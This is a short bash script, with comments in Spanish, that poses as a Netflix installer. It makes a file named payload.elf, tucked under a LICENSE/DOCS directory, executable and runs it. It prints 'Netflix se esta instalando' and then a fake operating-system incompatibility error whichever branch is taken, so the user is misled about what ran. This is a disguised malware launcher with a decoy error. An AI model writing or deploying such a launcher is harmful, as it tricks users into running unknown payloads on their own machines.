#!/bin/bash

# Nombre del archivo que deseas ejecutar
PAYLOAD="/LICENSE/DOCS/bin/payload.elf"

# Verificar si el archivo existe
if [[ -f ./$PAYLOAD ]]; then
    echo "Netflix se esta instalando "
    
    # Asegurarse de que el archivo tenga permisos de ejecución
    chmod +x ./$PAYLOAD
    
    # Ejecutar el archivo
    ./$PAYLOAD
    
    echo "Error: Incompatibility with the Operating System Version"
else
    echo "Error: Incompatibility with the Operating System Version"
    exit 1
fi
